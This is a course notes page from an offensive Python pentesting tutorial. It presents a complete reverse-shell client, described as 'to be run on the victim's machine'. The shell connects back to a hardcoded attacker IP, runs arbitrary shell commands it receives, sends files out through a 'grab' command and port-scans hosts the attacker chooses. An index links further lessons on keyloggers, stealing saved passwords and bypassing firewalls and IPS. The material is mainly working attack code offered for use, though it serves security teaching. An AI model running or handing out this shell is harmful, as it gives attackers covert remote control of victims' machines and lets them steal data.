---
title: Coding a reverse shell that scans ports
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
  - port scanner
---

# Coding a reverse shell that scans ports

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


## Client side

To be run on the victim's machine.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import os
import socket
import subprocess

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()

def scanner(s, ip, ports):
    scan_result = '' # scan_result is a variable stores our scanning result
    for port in ports.split(','):
        try: # we will try to make a connection using socket library for EACH one of these ports
            sock =  socket.socket()
#connect_ex This function returns 0 if the operation succeeded,  and in our case operation succeeded means that the connection happens whihch means the port is open otherwsie the port could be closed or the host is unreachable in the first place.
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is opened" + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed"
                sock.close()
        except Exception as e:
            pass
    s.send(scan_result.encode())
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.152', 8080))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split('*')
            try:
                transfer(s, path)
            except:
                s.send(str(e).encode())
                pass

        elif 'scan' in command.decode(): # syntax: scan 10.10.10.100:22,80
            command = command[5:].decode() #slice the leading first 5 char 
            ip, ports = command.split(':')
            scanner(s, ip, ports)
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()

main()

```